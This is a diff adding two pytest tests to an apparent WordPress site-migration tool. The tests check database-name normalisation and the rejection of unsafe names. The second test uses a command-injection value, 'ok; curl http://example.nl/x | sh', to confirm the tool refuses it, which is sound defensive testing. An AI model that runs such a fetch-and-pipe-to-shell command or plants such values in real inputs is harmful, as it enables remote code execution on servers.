@@ -618,3 +618,25 @@ def test_a_command_that_never_answers_becomes_a_note_and_not_a_hang():
                                                                  "was not looked at")})
     assert migrate.database_sizes(server, notes) == {}
     assert "didn't answer" in notes[0]
+
+
+def test_the_adopt_uses_the_name_the_new_server_made_and_asks_about_the_same_one(tmp_path):
+    """The old wp-config.php's name is not the one the new server created: it strips and lower-cases it."""
+    asked = []
+    fakes = Fakes()
+    site = _shop(database=" OldShop ")
+    _move(tmp_path, fakes, site=site, answer=dict(ANSWER, database="oldshop"), again=True,
+          ask=lambda text: asked.append(text) or "yes")
+    adopt = fakes.pipes[0][1]
+    assert adopt[adopt.index("--database") + 1] == "oldshop"
+    assert "oldshop" in asked[0] and "OldShop" not in asked[0]
+
+
+def test_a_database_name_the_new_server_would_refuse_never_reaches_a_command(tmp_path):
+    """On the resume and --again paths nothing applies the item first, so this is the only check there is."""
+    fakes = Fakes()
+    site = _shop(database="ok; curl http://example.nl/x | sh")
+    with pytest.raises(migrate.MoveFailed) as failed:
+        _move(tmp_path, fakes, site=site, answer={"ok": True, "docroot": ROOT})
+    assert "Nothing was copied" in str(failed.value)
+    assert fakes.rsync == [] and fakes.pipes == []
